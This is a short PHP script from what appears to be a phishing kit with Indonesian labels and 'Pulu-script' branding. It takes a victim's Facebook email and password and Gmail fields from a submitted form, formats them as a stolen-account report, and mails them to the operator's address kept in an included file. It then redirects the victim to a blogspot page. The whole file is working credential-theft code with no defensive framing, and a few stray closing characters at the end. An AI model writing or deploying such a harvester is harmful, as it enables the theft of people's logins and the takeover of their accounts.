<?php 

$userfb    = $_POST['user'];
$passfb = $_POST['pass'];
$gmail   = $_POST['gmail'];
$pwg = $_POST['pwg'];


$body = "
-===¦ Akun Facebook ¦===-

|>> Email : ".$userfb."
|>> Password : ".$passfb."



-===¦ Pulu Pulu ¦===-

";

include 'emailmu.php';
$subject ="Setor Akun Si [".$userfb."]";
$headers ="From: Pulu-script.com <ngntd@bhaha>";
mail($emailku, $subject, $body, $headers);


$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));
?>

<script>window.location.replace("https://pulu-puluuu.blogspot.com/2019/05/lanjutkan-ke-puluscript.html?m=1")</script>';}
}
?>